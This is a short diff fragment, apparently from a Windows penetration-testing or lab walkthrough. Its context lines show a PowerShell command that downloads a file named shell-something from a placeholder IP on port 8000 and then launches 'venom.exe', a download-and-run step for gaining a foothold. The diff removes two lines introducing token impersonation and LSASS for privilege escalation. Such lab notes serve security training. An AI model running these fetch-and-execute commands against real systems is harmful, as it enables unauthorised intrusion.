@@ -34,5 +34,3 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/she
 Start venom.exe:
 Start-Process "venom.exe"
 
-Now that we have initial access, let's use token impersonation to gain system access.
-Windows uses tokens to ensure that account have right privs to make some action that requires them. This is done by LSASS.exe
